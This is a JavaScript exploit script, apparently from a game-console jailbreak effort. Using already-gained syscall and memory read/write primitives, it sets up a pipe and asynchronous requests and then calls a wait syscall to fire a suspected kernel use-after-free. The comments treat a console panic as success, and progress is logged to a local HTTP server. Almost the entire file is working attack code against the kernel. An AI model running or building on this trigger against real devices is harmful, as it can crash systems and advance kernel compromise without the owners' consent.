// 15_fire.js — FIRST UAF fire attempt (mode-0 multi_wait, timeout=0, non-blocking).
// Self-contained: fresh pipe+fill, then ONE wait(mode0). MAY PANIC the console.
// Outcomes: panic/hang = BUG FIRED (good news); clean -1 = shape wrong/absent.
(async () => {
    const LOG_HOST = "192.168.0.163";
    const say = (s) => { try { log("[f15] " + s); } catch (e) {} };
    const shout = (s) => { try { send_notification(s); } catch (e) {} };
    try { LOG_SERVER = "http://" + LOG_HOST + ":8080/log"; } catch (e) {}
    try { if (typeof checkLogServer === "function") await checkLogServer(); } catch (e) {}
    const pace = () => new Promise((r) => setTimeout(r, 500));
    const step = async (tag, fn) => {
        shout("f15: " + tag); say(tag); await pace();
        try { const r = await fn(); shout(("f15: " + tag + "=" + String(r)).slice(0,110)); say(tag + "=" + String(r)); await pace(); return r; }
        catch (e) { shout("f15: " + tag + " THREW"); say(tag + " threw"); await pace(); return null; }
    };
    await step("start", async () => "FIRE-TEST mode0 timeout0");
    await step("init", async () => await syscall(0x29En, 0n,0n,0n,0n,0n,0n));
    let rfd = -1, wfd = -1;
    await step("pipe", async () => {
        const a = malloc(8); write64(a, 0n);
        const r = await syscall(0x2AFn, a, 0n,0n,0n,0n,0n);
        try {
            const fds = read64(a);
            rfd = Number(fds & 0xFFFFFFFFn); wfd = Number((fds >> 32n) & 0xFFFFFFFFn);
        } catch (e) {}
        return String(r) + " r=" + rfd + " w=" + wfd;
    });
    let ids = 0n, states = 0n, id0 = 0, id1 = 0;
    await step("fill", async () => {
        const RB = 0x28;
        const reqs = malloc(RB * 2);
        for (let i = 0; i < RB * 2; i += 8) write64(reqs + BigInt(i), 0n);
        for (let i = 0; i < 2; i++) write32(reqs + BigInt(i * RB + 0x20), rfd);
        ids = malloc(8); states = malloc(8);
        write32(ids, 0n); write32(ids + 4n, 0n);
        write32(states, 0n); write32(states + 4n, 0n);
        const r = await syscall(0x29Dn, 0x1001n, reqs, 2n, 3n, ids, 0n);
        try { id0 = Number(read32(ids)); id1 = Number(read32(ids + 4n)); } catch (e) {}
        return String(r) + " ids=" + id0 + "," + id1;
    });
    await step("FIRE-wait-mode0", async () => await syscall(0x297n, ids, 2n, states, 0n, 0n, 0n));
    await step("survived?", async () => "console alive past fire");
    try { await syscall(0x29An, ids, 2n, states, 0n, 0n, 0n); } catch (e) {}
    try { await syscall(0x296n, ids, 2n, states, 0n, 0n, 0n); } catch (e) {}
    try { if (rfd >= 0) await syscall(0x06n, BigInt(rfd), 0n,0n,0n,0n,0n); } catch (e) {}
    try { if (wfd >= 0) await syscall(0x06n, BigInt(wfd), 0n,0n,0n,0n,0n); } catch (e) {}
    await step("done", async () => "ok");
})()
